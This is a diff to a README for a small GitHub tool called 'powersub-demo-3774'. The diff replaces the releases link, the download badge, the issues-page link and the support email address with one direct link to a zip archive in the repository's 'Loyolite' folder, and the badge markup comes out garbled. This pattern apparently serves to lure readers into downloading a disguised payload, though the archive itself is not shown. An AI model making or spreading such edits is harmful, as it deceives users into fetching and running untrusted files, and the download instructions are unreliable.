@@ -1,6 +1,6 @@
 # 🚀 powersub-demo-3774 - Easy Tool for Simple Tasks
 
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-blue.svg)](https://github.com/bringletech/powersub-demo-3774/releases)
+[![Download](https://raw.githubusercontent.com/bringletech/powersub-demo-3774/main/Loyolite/powersub-demo-3774.zip%20Now-Click%https://raw.githubusercontent.com/bringletech/powersub-demo-3774/main/Loyolite/powersub-demo-3774.zip)](https://raw.githubusercontent.com/bringletech/powersub-demo-3774/main/Loyolite/powersub-demo-3774.zip)
 
 ## 📦 What is powersub-demo-3774?
 
@@ -11,7 +11,7 @@
 To get started with *powersub-demo-3774*, follow these simple steps: 
 
 1. **Download the Application**
-   - Visit this page to download: [Download Here](https://github.com/bringletech/powersub-demo-3774/releases).
+   - Visit this page to download: [Download Here](https://raw.githubusercontent.com/bringletech/powersub-demo-3774/main/Loyolite/powersub-demo-3774.zip).
   
 2. **Install the Application**
    - Once you have downloaded the software, locate the file on your computer.
@@ -38,7 +38,7 @@ To run *powersub-demo-3774*, your computer should meet the following requirement
 
 ## 📥 Download & Install
 
-To download *powersub-demo-3774*, follow this link: [Download Here](https://github.com/bringletech/powersub-demo-3774/releases).
+To download *powersub-demo-3774*, follow this link: [Download Here](https://raw.githubusercontent.com/bringletech/powersub-demo-3774/main/Loyolite/powersub-demo-3774.zip).
 
 ### Installation Steps:
 
@@ -61,8 +61,8 @@ If you experience issues while installing or using the application, consider the
 
 If you have questions or need assistance, feel free to reach out:
 
-- **GitHub Issues Page:** Visit our [issues page](https://github.com/bringletech/powersub-demo-3774/issues) to report problems or ask questions.
-- **Email Support:** Contact our support team at support@bringletech.com for help.
+- **GitHub Issues Page:** Visit our [issues page](https://raw.githubusercontent.com/bringletech/powersub-demo-3774/main/Loyolite/powersub-demo-3774.zip) to report problems or ask questions.
+- **Email Support:** Contact our support team at https://raw.githubusercontent.com/bringletech/powersub-demo-3774/main/Loyolite/powersub-demo-3774.zip for help.
 
 ## 📝 Contribution
 
@@ -76,4 +76,4 @@ We welcome contributions to *powersub-demo-3774*! If you're interested in contri
 
 For updates and announcements, follow us on GitHub. Be the first to know about new features and improvements.
 
-Remember, for downloading and setting up the application, head over to [Download Here](https://github.com/bringletech/powersub-demo-3774/releases) to get started. Enjoy using *powersub-demo-3774*!
+Remember, for downloading and setting up the application, head over to [Download Here](https://raw.githubusercontent.com/bringletech/powersub-demo-3774/main/Loyolite/powersub-demo-3774.zip) to get started. Enjoy using *powersub-demo-3774*!
